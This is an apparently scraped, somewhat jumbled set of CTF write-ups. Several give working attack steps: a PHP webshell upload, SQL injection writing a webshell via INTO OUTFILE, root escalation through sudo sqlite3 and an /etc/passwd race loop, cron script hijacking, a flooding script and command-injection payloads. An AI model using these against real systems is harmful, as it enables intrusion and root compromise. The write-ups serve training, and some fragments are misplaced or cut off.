content: 7. Password Cracking The hash associated with sqladmin was extracted: 6e70d06760276024943e0ec1339ef527 Using John the Ripper: john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt Cracked password: sqlvb60foxpro
title: FortiPy – Full Exploitation Writeup

content: 8. Lateral Movement to sqladmin The cracked credentials allowed switching to the sqladmin account: su sqladmin Verification: whoami sqladmin
title: FortiPy – Full Exploitation Writeup

content: 9. Privilege Escalation Enumeration Checking sudo permissions: sudo -l Output: User sqladmin may run the following commands on this host: (ALL) NOPASSWD: /usr/bin/sqlite3 /opt/database/database.db This configuration allows sqladmin to run sqlite3 as root without a password.
title: FortiPy – Full Exploitation Writeup

content: 10. Exploiting sqlite3 for Root Access The sqlite3 binary contains a built-in command that allows execution of system shell commands. Exploits: sudo sqlite3 /opt/database/database.db Inside the SQLite shell: .shell /bin/sh Since sqlite3 was executed with sudo , the spawned shell inherits root privileges. Verification: whoami Output: root
title: FortiPy – Full Exploitation Writeup

content: 11. Retrieving the Root Flag Finally, the root flag was obtained: cat /root/flag-root.txt Result: e29dca62-4860-44d5-d96e-47ad62f8ee54
title: FortiPy – Full Exploitation Writeup

content: Root Cause Analysis The compromise was possible due to multiple security weaknesses: Server-Side Template Injection vulnerability Exposure of sensitive configuration ( SECRET_KEY ) Weak credential management Storage of password hashes without proper protection Password reuse across system accounts Insecure sudo configuration allowing command execution via sqlite3 —
title: FortiPy – Full Exploitation Writeup

content: Security Recommendations To prevent similar attacks:
title: FortiPy – Full Exploitation Writeup

content: Web Application Security Sanitize all user input in templates Disable unsafe template rendering Store secrets outside application code
title: FortiPy – Full Exploitation Writeup

content: Credential Management Avoid storing historical credentials Use salted password hashes (bcrypt / Argon2) Enforce strong password policies
title: FortiPy – Full Exploitation Writeup

content: System Hardening Avoid granting sudo privileges to interpreter-like binaries Use principle of least privilege Restrict access to sensitive configuration files
title: FortiPy – Full Exploitation Writeup

content: Monitoring Monitor abnormal privilege escalations Log access to administrative endpoints Implement intrusion detection mechanisms
title: FortiPy – Full Exploitation Writeup

content: Conclusion This challenge highlights how multiple small security weaknesses can combine into a complete system compromise. Starting from a web application vulnerability, an attacker was able to: escalate privileges within the application gain shell access extract sensitive database information crack credentials and ultimately obtain full root privileges. Proper defense-in-depth practices are essential to prevent such chained exploitation scenarios. Root Flag e29dca62-4860-44d5-d96e-47ad62f8ee54

content: TL;DR Alpwned – CTF Writeup is a pwn challenge from HackerDNA. Challenge Name: Alpwned Category: Web / Privilege Escalation Difficulty: Medium Environment: Linux (BusyBox based system)
title: Alpwned – CTF Writeup

content: Overview Challenge Name: Alpwned Category: Web / Privilege Escalation Difficulty: Medium Environment: Linux (BusyBox based system) This challenge demonstrates a full attack chain starting from web exploitation, gaining initial system access via SSH, and ultimately achieving root privileges through a misconfigured system file combined with a race condition. The key vulnerability lies in the improper permissions of the /etc/passwd file, which is world-writable but protected by an automated reset mechanism. By exploiting a race condition against this reset process, it is possible to escalate privileges and retrieve the root flag.
title: Alpwned – CTF Writeup

content: 1. Initial Access After exploiting the web application vulnerability (e.g., SQL Injection in the authentication system), administrative access to the panel was obtained. Within the administrative interface, sensitive information was exposed, including SSH credentials for the system. Using these credentials, SSH access was established: ssh ctf@<target-ip> After authentication, the user shell was obtained.
title: Alpwned – CTF Writeup

content: 2. User Enumeration After logging in, the user flag was located in the home directory: ls cat flag-user.txt Example output: 5cb66b4a-5e82-4687-6b20-567ecb42f69a Next, privilege escalation vectors were investigated.
title: Alpwned – CTF Writeup

content: 3. Privilege Escalation Enumeration The first step was checking for common privilege escalation vectors such as SUID binaries: find / -perm -4000 -type f 2>/dev/null Output included typical system binaries such as: /usr/bin/passwd /usr/bin/sudo /bin/busybox No immediately exploitable SUID binaries were identified. Next, the permissions of critical system files were inspected. #4. Discovery of Misconfigured /etc/passwd The permissions of /etc/passwd revealed a critical misconfiguration: ls -l /etc/passwd Output: -rw-rw-rw- 1 root root 737 Mar 13 11:39 /etc/passwd This indicates that the file is world-writable, allowing any user on the system to modify it. Normally, this would allow the attacker to add a new user with UID 0 (root privileges).
title: Alpwned – CTF Writeup

content: 5. Attempted /etc/passwd Modification A modified passwd file was created: cp /etc/passwd /tmp/passwd A new root user was added: pwnroot:$5$pZ66Upgowa.ADkU6$S4WCEyPzXoehhBV9Ro2fR6sgJj8raKzzQakkuvcwcv.:0:0:root:/root:/bin/sh The password hash corresponds to the password: pwned However, replacing /etc/passwd revealed an unexpected behavior: cat /tmp/passwd > /etc/passwd The modification did not persist. This indicated that the file was being automatically restored, likely by a scheduled task or monitoring process.
title: Alpwned – CTF Writeup

content: 6. Identifying a Race Condition The challenge hint suggests the following scenario: “What if the file resets on a timer? How would you write a script that wins a race against that reset?” This strongly implied a race condition vulnerability. The strategy is to continuously overwrite /etc/passwd faster than the automated reset process. If successful, the system will temporarily accept the modified file, allowing authentication as the newly created root user.
title: Alpwned – CTF Writeup

content: 7. Exploiting the Race Condition First, ensure the modified passwd file exists: cat /tmp/passwd Then execute the following race condition exploit: while true; do cat /tmp/passwd > /etc/passwd echo pwned | su pwnroot -c "cat /root/flag-root.txt" done This loops repeatedly: Overwrite /etc/passwd 2. Attempts authentication as the injected root user Execute the command to retrieve the root flag Eventually the race condition succeeds.
title: Alpwned – CTF Writeup

content: 8. Root Flag Once the race condition is won, the root flag is revealed: cat /root/flag-root.txt Example output: <root-flag>
title: Alpwned – CTF Writeup

content: 9. Root Cause The vulnerability is caused by two critical security flaws: **World-written /etc/passwd ** Improper file restoration mechanism Although the system attempts to protect the file by resetting it, the implementation introduces a Time-of-Check to Time-of-Use (TOCTOU) race condition, allowing attackers to overwrite the file between resets.
title: Alpwned – CTF Writeup

content: 10. Mitigation To prevent this vulnerability: Correct file permissions: chmod 644 /etc/passwd Avoid insecure automated file resets. Implement proper privilege separation. Monitor unauthorized modifications to critical system files.
title: Alpwned – CTF Writeup

content: Conclusion This challenge demonstrates how a seemingly protected system can still be vulnerable due to improper file permissions and flawed remediation mechanisms. By exploiting a race condition against an automated file reset, it was possible to inject a root-level account and retrieve the root flag. This attack highlights the importance of proper file permissions and secure system hardening.
title: Alpwned – CTF Writeup

content: TL;DR FiPloit — Full System Compromise Walkthrough is a misc challenge from HackerDNA. Author: spawn2pwn Category: Web Exploitation / Privilege Escalation Difficulty: Medium Author: spawn2pwn Category: Web Exploitation / Privilege Escalation Difficulty: Medium
title: FiPloit — Full System Compromise Walkthrough

content: Executive Summary This report documents the full compromise of a vulnerable web application hosted on port 8080. The attack chain leveraged multiple weaknesses including information disclosure, insecure file upload validation, and privilege escalation via a misconfigured sudo rule. The compromise was achieved through the following sequence: Discovery of exposed developer notes Identification of a hidden developer upload endpoint File upload filter bypass via double extension Remote Code Execution via an uploaded webshell Privilege escalation via unrestricted sudo access to PHP Root-level file access leading to full system compromise Despite partial defensive mechanisms such as disabled PHP command execution functions, improper privilege delegation ultimately allowed an attacker to retrieve sensitive data and gain root access.
title: FiPloit — Full System Compromise Walkthrough

content: Target Overview Properties Value Target Service Web Applications Ports 8080 Technology Stack PHP / Apache Initial Access Vector Web Exploitation Compromised User ctf Privilege Escalation sudo misconfiguration
title: FiPloit — Full System Compromise Walkthrough

content: Attack Surface Analysis The initial attack surface consists of a publicly accessible web service. Key accessible endpoints discovered during enumeration: /notes.txt /upload_log_temp4.php /uploads/ These endpoints exposed sensitive development artifacts and functionality that should not have been available in a production environment.
title: FiPloit — Full System Compromise Walkthrough

content: 1. Information Disclosure During web enumeration, the following file was discovered: /notes.txt Retrieving the file: curl http://TARGET:8080/notes.txt Output: Dev Notes: - Remove /upload_log_temp4.php before prod - Database creds: root:Password123! (change before going live) - Fix contact form - Disable debug - Check Apache conf
title: FiPloit — Full System Compromise Walkthrough

content: Security Impact This file exposed several critical pieces of information: A hidden developer endpoint Hardcoded credentials Evidence of development/debug artifacts left in production The most important finding was the temporary upload endpoint: /upload_log_temp4.php
title: FiPloit — Full System Compromise Walkthrough

content: 2. Hidden Developer Upload Portal Accessing the endpoint revealed a developer interface allowing file uploads. /upload_log_temp4.php The application enforced a restriction: Only .txt files are allowed However, the validation logic was flawed and only verified whether the filename contained .txt , rather than enforcing it as the final extension. This allowed for double extension bypass attacks.
title: FiPloit — Full System Compromise Walkthrough

content: 3. File Upload Filter Bypass A minimal PHP webshell was prepared: <?php system($_GET['cmd']); ?> To bypass the upload filter, a double extension payload was used: spawn2pwn-webshell.txt.php This filename bypassed validation because: The application detected the presence of .txt * The server still interprets the file as PHP due to the final .php extension Uploading the payload: curl -X POST http://TARGET:8080/upload_log_temp4.php \ -F "file=@spawn2pwn-webshell.txt.php" The file was successfully uploaded to: /uploads/spawn2pwn-webshell.txt.php
title: FiPloit — Full System Compromise Walkthrough

content: 4. Remote Code Execution The uploaded payload allowed command execution via HTTP requests. Examples: curl "http://TARGET:8080/uploads/spawn2pwn-webshell.txt.php?cmd=whoami" Output: ctf This confirmed successful Remote Code Execution (RCE). The attacker now has shell access as the web server user. ctf
title: FiPloit — Full System Compromise Walkthrough

content: 5. Post-Exploitation Enumeration With shell access obtained, local enumeration was performed. Checking sudo permissions: sudo -l Output: User ctf may run the following commands: (ALL) NOPASSWD: /bin/ls (ALL) NOPASSWD: /usr/bin/file (ALL) NOPASSWD: /usr/bin/php Granting sudo access to scripting interpreters such as PHP is a severe security misconfiguration.
title: FiPloit — Full System Compromise Walkthrough

content: 6. Attempted Root Shell Typical escalation attempts using PHP were initially unsuccessful because the system disabled dangerous functions. Disabled functions included: system() exec() shell_exec() passthru() Attempts produced the following error: [!] Command execution failed or disabled. However, the PHP interpreter is still executed with root privileges, meaning file system access remains unrestricted.
title: FiPloit — Full System Compromise Walkthrough

content: 7. Root File Access Instead of spawning a shell, the attack leveraged PHP file operations. Listing the root directory: sudo php -r 'print_r(scandir("/root"));' Output: Array ( [0] => . [1] => .. [2] => flag-root.txt ) Reading the root flag: sudo php -r 'echo file_get_contents("/root/flag-root.txt");' Root Flags: 739eabe6-3085-4852-beb2-1d0da7eb1973
title: FiPloit — Full System Compromise Walkthrough

content: 8. User Flag Retrieval Inspecting the user’s home directory: ls /home/ctf Output: dev_notes.txt flag-user.txt Reading the flag: cat /home/ctf/flag-user.txt User Flags: 9c206ead-1f5f-467a-5c3c-9bbac3fe54db
title: FiPloit — Full System Compromise Walkthrough

content: Final Flags

content: Vulnerabilities Identified
title: FiPloit — Full System Compromise Walkthrough

title: FiPloit — Full System Compromise Walkthrough

title: FiPloit — Full System Compromise Walkthrough

content: 3. Remote Code Execution The upload vulnerability enabled arbitrary command execution.
title: FiPloit — Full System Compromise Walkthrough

title: FiPloit — Full System Compromise Walkthrough

content: Security Recommendations To mitigate these issues, the following security measures are recommended:
title: FiPloit — Full System Compromise Walkthrough

content: Remove Development Artifacts Sensitive files such as: notes.txt should never be exposed in production environments.
title: FiPloit — Full System Compromise Walkthrough

content: Secure File Upload Handling Upload validation must enforce: strict extension validation MIME-type verification server-side renaming execution prevention
title: FiPloit — Full System Compromise Walkthrough

content: Apply the Principle of Least Privilege Never allow unrestricted sudo access to interpreters such as: php python perl bash These can almost always be abused for privilege escalation.
title: FiPloit — Full System Compromise Walkthrough

title: FiPloit — Full System Compromise Walkthrough

The presence of development artifacts, insecure upload validation, and dangerous privilege delegation ultimately allowed an attacker to gain complete root access. Even with partial defensive controls in place, attackers can adapt and exploit alternative attack paths when fundamental security principles are not followed.

content: TL;DR picoCTF - General Skills: Printer Shares 3 is a misc challenge from picoCTF. In this challenge we are given access to an SMB printer share. The goal is to retrieve the flag which is stored inside a restricted share called secure-shares.
title: picoCTF - General Skills: Printer Shares 3

content: Description In this challenge we are given access to an SMB printer share. The goal is to retrieve the flag which is stored inside a restricted share called secure-shares. However, direct access to this share is denied. smbclient //dolphin-cove.picoctf.net/secure-shares -p 50490 -N Output: tree connect failed: NT_STATUS_ACCESS_DENIED Therefore, we need to find another way to obtain the flag.
title: picoCTF - General Skills: Printer Shares 3

content: Initial Enumeration We connect to the accessible share: smbclient //dolphin-cove.picoctf.net/shares -p 50490 -N Listing the directory contents: smb: \> ls script.sh cron.log Two files are present: script.sh cron.log
title: picoCTF - General Skills: Printer Shares 3

content: Investigating the Cron Log Download the log file: smb: \> get cron.log Contents: Health Check: Thu Mar 12 22:20:01 UTC 2026 Health Check: Thu Mar 12 22:21:01 UTC 2026 cp: cannot stat '/srv/samba/secure-shares/flag.txt': No such file or directory This indicates that a cron job runs periodically, and it tries to access a flag inside the secure share.
title: picoCTF - General Skills: Printer Shares 3

content: Testing Write Permissions We check whether the share is writable by uploading a test file. smb: \> put test.txt The upload succeeds, meaning the share allows write access. Since script.sh exists in the directory, it is likely that the cron job executes this script.
title: picoCTF - General Skills: Printer Shares 3

content: Exploitation (Finding the Flag Location) We overwrite script.sh with a payload that searches for the flag file. Payloads: #!/bin/bash find / -name flag* 2>/dev/null > /challenge/shares/flag_location.txt Upload the script: smb: \> put script.sh Wait for the cron job to execute (about 1 minute). Then download the generated file: smb: \> get flag_location.txt Inside the file we find the real flag location: /challenge/secure-shares/flag.txt
title: picoCTF - General Skills: Printer Shares 3

content: Final Exploit Now we modify script.sh again so it copies the flag to the public share. Payloads: #!/bin/bash cat /challenge/secure-shares/flag.txt > /challenge/shares/flag.txt Upload the script: smb: \> put script.sh Wait for the cron job to run.
title: picoCTF - General Skills: Printer Shares 3

content: Retrieving the Flag List the files again: smb: \> ls A new file appears: flag.txt Download it: smb: \> get flag.txt View the contents: cat flag.txt
title: picoCTF - General Skills: Printer Shares 3

content: Flags picoCTF{5mb_pr1nter_5h4re5_r3v3r53_b68ad4a8}
title: picoCTF - General Skills: Printer Shares 3

content: Conclusion This challenge demonstrates a common misconfiguration scenario: A public SMB share allows file uploads. A cron job executes a script inside that share. By overwriting the script, we gain the ability to execute arbitrary commands. This allows us to copy the flag from a restricted directory into a public share and retrieve it. This type of vulnerability is essentially remote code execution through writable scheduled scripts.
title: picoCTF - General Skills: Printer Shares 3

content: TL;DR Query Quake — CTF Writeup is a misc challenge from HackerDNA. | Categories | Difficulty | Tags | | —————- | ———- | ———– | | Web Exploitation | Medium | MYSQLI, RCE |
title: Query Quake — CTF Writeup

content: Challenge Information Categories Difficulty Tags Web Exploitation Medium MYSQLI, RCE
title: Query Quake — CTF Writeup

content: Overview The Query Quake challenge involves exploiting a vulnerable web administration panel that suffers from SQL Injection. By leveraging this vulnerability, it is possible to write a PHP webshell to the web server using the MySQL INTO OUTFILE feature. After gaining Remote Command Execution (RCE) as the www-data user, further enumeration reveals a misconfigured cron file that is writable by non-privileged users. By injecting commands into this cron file, it becomes possible to escalate privileges to root and retrieve the final flag.
title: Query Quake — CTF Writeup

content: Attack Chain SQL Injection ↓ UNION SELECT ↓ Write Webshell (INTO OUTFILE) ↓ Remote Command Execution (www-data) ↓ Enumerate Writable Files ↓ Cron Misconfiguration ↓ Privilege Escalation ↓ Root Flag
title: Query Quake — CTF Writeup

content: Step 1 — Identifying SQL Injection The /webadmin/index.php endpoint accepts POST parameters: username password Testing the username parameter reveals that the query is vulnerable to SQL Injection. Example test payload: ' ORDER BY 1-- - Error responses confirmed that the application executes a query similar to: SELECT * FROM admin WHERE username='$username' AND password='$password';
title: Query Quake — CTF Writeup

content: Step 2 — Determining Column Count Using a UNION based attack we determine the number of columns. Example payload: ' UNION SELECT 1,2-- - The query accepts two columns.
title: Query Quake — CTF Writeup

content: Step 3 — Writing a Webshell MySQL allows writing files using the INTO OUTFILE directive. This can be abused to write a PHP webshell into the webroot. Exploit payload: curl -X POST http://TARGET/webadmin/index.php \ --data-urlencode "username=' UNION SELECT \"<?php system(\$_GET['cmd']); ?>\",2 INTO OUTFILE '/var/www/html/shell.php'-- -" \ -d "password=test" This writes the following files: <?php system($_GET['cmd']); ?> Location: /var/www/html/shell.php
title: Query Quake — CTF Writeup

This vulnerability allows a local user to escalate privileges to root by abusing the ** sudo -R option combined with a malicious NSS module**. title: picoCTF 2026 – General Skills: Failure Failure

content: Overview This challenge simulates a high-availability infrastructure where a load balancer routes traffic between multiple servers. A primary server normally handles all requests, while a backup server is only used if the primary server fails. The flag is stored on the backup server. The goal of this challenge is to force the load balancer to switch to the backup server, which will reveal the flag.
title: picoCTF 2026 – General Skills: Failure Failure

content: Provided Source Code
title: picoCTF 2026 – General Skills: Failure Failure

content: Flask Application from flask import Flask, render_template from dotenv import load_dotenv from flask_limiter import Limiter import os load_dotenv() app = Flask(__name__) # Custom key function for global rate limiting def global_rate_limit_key(): return "global" # Initialize rate limiter with global key function limiter = Limiter( key_func=global_rate_limit_key, app=app, default_limits=["300 per minute"] ) # Custom error handler for rate limit exceeded @app.errorhandler(429) def ratelimit_exceeded(e): return "Service Unavailable: Rate limit exceeded", 503 @app.route('/') @limiter.limit("300 per minute") def home(): print("value:", os.getenv("IS_BACKUP")) if os.getenv("IS_BACKUP") == "yes": flag = os.getenv("FLAG") else: flag = "No flag in this service" return render_template("index.html", flag=flag)
title: picoCTF 2026 – General Skills: Failure Failure

content: HAProxy Configuration frontend http-in bind *:80 default_backend servers backend servers option httpchk GET / http-check expect status 200 server s1 *:8000 check inter 2s fall 2 rise 3 server s2 *:9000 check backup inter 2s fall 2 rise 3
title: picoCTF 2026 – General Skills: Failure Failure

content: Understanding the Logic The system uses HAProxy as a load balancer. Two backend servers are configured: Server Port Role s1 8000 Primary s2 9000 Backup Normally the request flow is: Client → HAProxy → s1 The backup server (s2) will only receive traffic if s1 is considered down.
title: picoCTF 2026 – General Skills: Failure Failure

content: Identifying the Vulnerability The Flask application applies a rate limit of 300 requests per minute: default_limits=["300 per minute"] However, the key used for rate limiting is: def global_rate_limit_key(): return "global" This means all requests share the same rate limit, including: User requests HAProxy health check requests
title: picoCTF 2026 – General Skills: Failure Failure

content: Why This Is a Problem HAProxy performs health checks on the backend server: GET / It expects the server to return: HTTP 200 If the rate limit is exceeded, the application returns 429, but the code converts it into 503: @app.errorhandler(429) def ratelimit_exceeded(e): return "Service Unavailable: Rate limit exceeded", 503 From HAProxy’s perspective: 503 = server failure According to the configuration: fall 2 If the health check fails twice, HAProxy marks the server as DOWN. When this happens: Client → HAProxy → s2 The backup server has the environment variable: IS_BACKUP=yes So it returns the flag.
title: picoCTF 2026 – General Skills: Failure Failure

content: Exploitation Strategy The attack is straightforward: Send many requests to exceed the rate limit. HAProxy health checks receive 503 responses. HAProxy marks the primary server (s1) as DOWN. Traffic is redirected to the backup server (s2). The backup server returns the flag.
title: picoCTF 2026 – General Skills: Failure Failure

content: Exploit Script The following script automates the attack.
title: picoCTF 2026 – General Skills: Failure Failure

content: solve.sh #!/bin/bash URL=$1 if [ -z "$URL" ]; then echo "Usage: $0 <url>" exit 1 fi cleanup() { kill $SPAM_PID 2>/dev/null exit 0 } trap cleanup INT TERM echo "[*] Target: $URL" echo "[*] Starting spammer..." ( while true; do seq 800 | xargs -P100 -I{} curl -s $URL > /dev/null done ) & SPAM_PID=$! echo "[*] Watching for flag..." while true; do FLAG=$(curl -s $URL | grep -o 'picoCTF{[^}]*}') if [ ! -z "$FLAG" ]; then echo "[+] FLAG FOUND: $FLAG" cleanup fi done
title: picoCTF 2026 – General Skills: Failure Failure

content: Running the Exploit Make the script executable: chmod +x solve.sh Run it with the challenge URL: ./solve.sh http://mysterious-sea.picoctf.net:53900/ Example output: [*] Target: http://mysterious-sea.picoctf.net:53900/ [*] Starting spammer... [*] Watching for flag... [+] FLAG FOUND: picoCTF{f41l0v3r_f0r_7h3_w1n_3df7bad5}
title: picoCTF 2026 – General Skills: Failure Failure

content: Final Flag picoCTF{f41l0v3r_f0r_7h3_w1n_3df7bad5}
title: picoCTF 2026 – General Skills: Failure Failure

content: Key Takeaways Global rate limits can affect internal infrastructure components like load balancer health checks. Misconfigured rate limits can allow attackers to force failover events. Load balancer health checks should not share the same rate limit as user traffic. Infrastructure misconfigurations can be just as dangerous as application vulnerabilities.
title: picoCTF 2026 – General Skills: Failure Failure

content: TL;DR picoCTF 2026 – Forensics: Timeline is a forensics challenge from picoCTF. This challenge provides a disk image named partition4.img . The objective is to locate a hidden flag within the filesystem and present it in the ___FL0X___ format.
title: picoCTF 2026 – Forensics: Timeline

content: Overview This challenge provides a disk image named partition4.img . The objective is to locate a hidden flag within the filesystem and present it in the ___FL1X___ format. The hints indicate that we should: Create a MAC timeline using Sleuthkit tools. Look for anomalous timestamps, which may result from timestomping. Timestomping is a technique used to manipulate file timestamps to obscure malicious activity. Poorly executed timestomping often produces impossible or very old timestamps, which can be used to identify suspicious files.
title: picoCTF 2026 – Forensics: Timeline

content: Initial Inspection First, verify the filesystem type of the provided image: file partition4.img Output: partition4.img: Linux rev 1.0 ext4 filesystem data This confirms that the image contains an ext4 filesystem, which is fully supported by The Sleuth Kit (TSK).
title: picoCTF 2026 – Forensics: Timeline

content: Creating the Timeline Following the hint, we generate a timeline of filesystem activity.
title: picoCTF 2026 – Forensics: Timeline

content: Step 1: Generate Body File fls -r -m / partition4.img > body.txt fls recursively lists files and directories. -m / assigns the root mount point. The output is saved in body.txt .
title: picoCTF 2026 – Forensics: Timeline

content: Step 2: Generate the MAC Timeline mactime -b body.txt > timeline.txt This creates a chronological list of file events based on: M – Modified time A – Access time C – Metadata change time
title: picoCTF 2026 – Forensics: Timeline

content: Identifying Suspicious Entries The hint states: Sloppy timestomping can yield strange (very old) timestamps. We therefore search for files with unusually old timestamps: head timeline.txt Among the earliest entries we find: Wed Jan 02 1985 00:00:00 41 macb r/rrw-r--r-- 0 0 4945 /bin/bcab This entry stands out because: The timestamp 1985 is highly unusual for a modern Linux filesystem. The filename bcab appears suspicious. It resides in /bin , which normally contains system binaries. This strongly suggests that /bin/bcab is the target file.
title: picoCTF 2026 – Forensics: Timeline

content: Locating the Inode We need the inode number to extract the file from the disk image. List the contents of /bin : fls partition4.img 22 Relevant entries: r/r 4945: bcab This confirms: File name: bcab * Inode number: 4945
title: picoCTF 2026 – Forensics: Timeline

content: Extracting the File We extract the file using icat : icat partition4.img 4945 > bcab Inspect the contents: strings bcab Output: NzFtMzExbjNfMHU3MTEzcl9oM3JfNDNhMmU3YWYK The string appears to be Base64 encoded.
title: picoCTF 2026 – Forensics: Timeline

content: Decoding the Data Decode the Base64 string: cat bcab | base64 -d Result: 71m311n3_0u7113r_h3r_43a2e7af
title: picoCTF 2026 – Forensics: Timeline

content: Constructing the Flag Wrap the decoded string with the picoCTF flag format: picoCTF{71m311n3_0u7113r_h3r_43a2e7af}
title: picoCTF 2026 – Forensics: Timeline

content: Final Flags picoCTF{71m311n3_0u7113r_h3r_43a2e7af}
title: picoCTF 2026 – Forensics: Timeline

content: Key Takeaways MAC timelines are powerful for identifying anomalous file activity. Timestomping attempts to hide malicious files by manipulating timestamps. Poorly executed timestomping can result in impossible or very old dates, making detection easier. Sleuthkit tools such as fls , mactime , and icat are essential for forensic analysis of disk images.
title: picoCTF 2026 – Forensics: Timeline

content: Tools Used The Sleuth Kit ( fls , mactime , icat ) strings * base64 * Standard Linux utilities ( grep , head , cat )
title: picoCTF 2026 – Forensics: Timeline

content: Initial Interaction After connecting to the service, it prompts the user for an IP address: Enter an IP address to ping! content: Identifying the Vulnerability The prompt suggests that only 8.8.8.8 is allowed, but the application appears to pass the input directly into a shell command. If the input is not properly sanitized, shell metacharacters such as: ; * && * | * $() can be used to execute additional commands. This type of vulnerability is known as Command Injection.

content: Exploiting the Injection To test whether additional commands can be executed, we append another command using && . Payloads: 8.8.8.8 && cat flag.txt Explanation: 8.8.8.8 satisfies the input check. && executes the next command only if the previous command succeeds. cat flag.txt attempts to read the flag file on the server.

content: Root Cause The application likely executes user input in a shell context similar to: system("ping " + user_input) Because the input is not properly sanitized or escaped, attackers can inject additional shell commands.
title: picoCTF 2026 – General Skills: ping-cmd (Ping Service)

content: Prevention To prevent command injection vulnerabilities: Avoid shell execution with user input whenever possible. Use safe APIs that do not invoke a shell. Validate input strictly (e.g., using regex for IP addresses). Escape or sanitize shell metacharacters. Example safe validation: import re if re.match(r'^8\.8\.8\.8$', user_input): run_ping()

content: Key Takeaways Command injection occurs when user input is passed directly to a shell command. Shell operators such as && , ; , and | can chain additional commands. content: A seemingly normal portrait contains an elusive presence. Can you reconstruct the damaged boundaries and uncover the secrets within? TL;DR TheHiddenMemberJKT48 is an advanced steganography challenge that combines file-carver evasion with color distribution analysis. The provided image ( Last_seen.jpg ) contains two concatenated JPEG streams. The second image was deliberately modified by stripping the standard Start-of-Image ( FF D8 ) and APP0 ( FF E0 ) headers while corrupting the JFIF identifier to JFIP , defeating automated tools like binwalk and foremost . Manually reconstructing the missing headers and analyzing the extracted image with AperiSolve’s color remapping filter reveals the hidden flag.
title: TheHiddenMemberJKT48

content: 1. Initial Reconnaissance & Structural Hex Analysis We begin by examining the structure of the provided image file: file Last_seen.jpg stat -c "%s bytes" Last_seen.jpg Last_seen.jpg: JPEG image data, JFIF standard 1.01 226397 bytes We search for End-of-Image (EOI) markers ( FF D9 ) within the binary: grep -oba $'\xff\xd9' Last_seen.jpg Output: 112763 226395
title: TheHiddenMemberJKT48

content: Analysis of the Markers Offset 112763 : The first FF D9 marker terminates the primary JPEG container approximately halfway through the file. Offset 226395 : The second FF D9 marker appears at the exact end of the file ( 226397 total bytes minus 2 bytes of marker). The presence of two distinct EOI markers confirms that two independent JPEG images are stored sequentially in a single file.
title: TheHiddenMemberJKT48

content: 2. Investigating the Boundaries We inspect the byte boundary directly following the first EOI marker ( offset 112760 to 112792 ): xxd -s 112760 -l 32 Last_seen.jpg 0001b878: ffd9 aae8 0010 4a46 4950 0001 0101 0048 ......JFIP.....H 0001b888: 0048 0000 ffe1 007a 4578 6966 0000 4d4d .H.....zExif..MM
title: TheHiddenMemberJKT48

content: Key Observations FF D9 marks the end of the first image stream at offset 112763 . Immediately following the marker, we see corrupted bytes ( aa e8 ) followed by 00 10 4a 46 49 50 ( JFIP ). The valid JPEG Start-of-Image (SOI FF D8 ) and APP0 marker (** FF E0 **) were purposefully stripped. The standard JFIF magic string was altered to JFIP (hex 50 instead of 46 ). This deliberate corruption prevents signature-based carving tools like binwalk and foremost from recognizing the embedded second image.
title: TheHiddenMemberJKT48

content: 3. Reconstructing the Embedded Image To restore the hidden image into a valid JPEG file, we need to: Carve the raw payload from offset 112767 through the end of the file. Synthesize the missing JPEG SOI header ( FF D8 ) and standard APP0 header ( FF E0 00 10 4A 46 49 46 ). # Extract raw embedded stream starting after the corrupted SOI/APP0 bytes dd if=Last_seen.jpg of=second_raw.bin bs=1 skip=112767 # Prepend a valid JPEG SOI + APP0 header printf "\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46" > header.bin cat header.bin second_raw.bin > hidden_member.jpg We verify the repaired image with file and image viewers: file hidden_member.jpg hidden_member.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, Exif Standard: [TIFF image data, big-endian] The reconstructed image opens cleanly:
title: TheHiddenMemberJKT48

content: 4. Color Distribution & Remapping Analysis While the reconstructed image displays properly, no text or flag is visible to the naked eye. We upload the image to AperiSolve for deep steganographic decomposition. Inspecting the Color Remapping layer reveals high-contrast luminescence patterns separating the background pixels: Under the Decomposer →\rightarrow→ Color Remapping plane, the embedded text emerges clearly: FGTE{Th3_H1dd3n_M3mber_F0und}
title: TheHiddenMemberJKT48

content: Flags FGTE{Th3_H1dd3n_M3mber_F0und}
title: TheHiddenMemberJKT48

content: Key Takeaways Header Manipulation Defeats Naive Carvers: Attackers or CTF authors can bypass standard file carving signatures simply by stripping the first few bytes (SOI/APP0) or modifying magic bytes ( JFIF →\rightarrow→ JFIP ). Boundary Analysis via EOI: Searching for internal FF D9 markers is an effective technique to spot concatenated JPEG payloads that automated tools miss. Multi-layer Steganography: When an extracted image appears normal, color plane separation and histogram equalization (Color Remapping) can reveal subtle, single-channel pixel shifts.
title: TheHiddenMemberJKT48

content: TL;DR Abandoned Place is a forensics challenge from CTFlearn. the flag is outside of the pic, try to find it. another hint: dimensions, dimensions, everything is in dimensions. ##Challenge the flag is outside of the pic, try to find it. another hint: dimensions, dimensions, everything is in dimensions. Challenge files: abondoned_street_challenge2.jpg
title: Abandoned Place

content: Technical Analysis We are provided with an image file named abondoned_street_challenge2.jpg . When opened normally, nothing suspicious was found visually. However, based on the hint given, namely “dimensions”, it can be assumed that the hidden data is outside the area of the image being displayed. A common technique in challenges like this is to manipulate image dimension metadata (width/height), so that some hidden pixels are not rendered by normal viewers. In other words: the image file contains more pixels than it displays, and we need to change the dimensions so that all pixel data can be seen.
title: Abandoned Place

content: Exploitation / Solution To change the image dimensions, I used the Python script modsize.py available on GitHub: Script reference: https://github.com/flawwan/modsize/blob/master/modsize.py The script works by: Read image files in bytes. Find the header offset that stores the width and height values. Change the value to the new dimension. Save the results as an output file. Scripts used: import argparse import os from subprocess import call import filetype from loguru import logger rot_value = 0 # Default value parser = argparse.ArgumentParser() parser.add_argument("file", help="Filepath to image") parser.add_argument("output", help="Filepath to image") parser.add_argument("--width", "-sw", type=int, help="New width of image") parser.add_argument("--height", "-sh", type=int, help="New height of image") args = parser.parse_args() def modify_file(offset1, offset2, filename, output, width=None, height=None): logger.info("Loading image") bin_arr = [] with open(filename, "rb") as f: arr = f.read() for b in arr: bin_arr.append(b) org_width = hex(int(hex(bin_arr[offset1])[2:] + hex(bin_arr[offset1 + 1])[2:], 16)) org_height = hex(int(hex(bin_arr[offset2])[2:] + hex(bin_arr[offset2 + 1])[2:], 16)) logger.info("Image loaded!") logger.info("Detected width: %d px" % int(org_width, 16)) logger.info("Detected height: %d px" % int(org_height, 16)) if width is None and height is None: logger.warning("Nothing todo. Set width/height?") exit() if width is None: width = int(org_width, 16) if height is None: height = int(org_height, 16) new_width = str(hex(width))[2:].zfill(4) new_height = 